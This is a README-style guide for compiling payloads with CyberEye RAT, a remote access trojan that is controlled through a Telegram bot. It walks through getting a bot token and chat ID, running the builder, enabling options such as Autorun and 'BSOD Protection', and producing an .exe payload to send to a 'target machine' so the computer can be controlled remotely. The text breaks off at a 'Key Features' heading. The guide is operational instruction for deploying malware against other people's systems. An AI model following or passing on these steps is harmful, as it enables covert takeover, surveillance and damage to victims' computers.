# :hammer: Compiling guide using Builder:  

* Go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. You need to save the token and bot name.  
  ![](images/createBot.JPG)  
* Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/chatid_echo_bot) and save the id.  
  ![](images/chatidBot.JPG)  
* Now you need to download [Latest stable release](https://github.com/cisamu123/CyberEye/releases)  
  ![](images/DownloadAndUnzipBuilder.jpg)  
* After downloading the `.zip` archive, extract it to any folder on your system.  
* Inside the extracted folder, run the file `CyberEye.Client.Builder.exe`  
  ![](images/ExecuteBuilder.jpg)
* ‚ö†Ô∏è **Important:** Make sure to also move the entire `Stub` folder (included in the archive) to the **same directory** as the Builder.  
  Without the `Stub` folder in the correct location, the builder will not be able to generate the final payload.
* In the builder, fill in the required fields:  
  - **Bot Token** (from [@BotFather](https://t.me/BotFather))  
  - **Chat ID** (from [@chatid_echo_bot](https://t.me/chatid_echo_bot))  
  - Enable optional features using checkboxes (e.g., Autorun, BSOD Protection, etc.)

* Click **Build**, then choose where to save the final `.exe` payload.
  ![](images/BuilderBuild.jpg)

‚úÖ That‚Äôs it ‚Äî no need to touch Visual Studio. Just fill, click, and deploy!
* You can send the generated .exe payload to your target machine.  
* After starting the file, you can control the computer through the bot.

* Write `/help` to see all available commands.  
### **This release introduces a new standalone payload builder for CyberEye RAT, enabling users to generate customized payloads with ease.**

## üîë Key Features
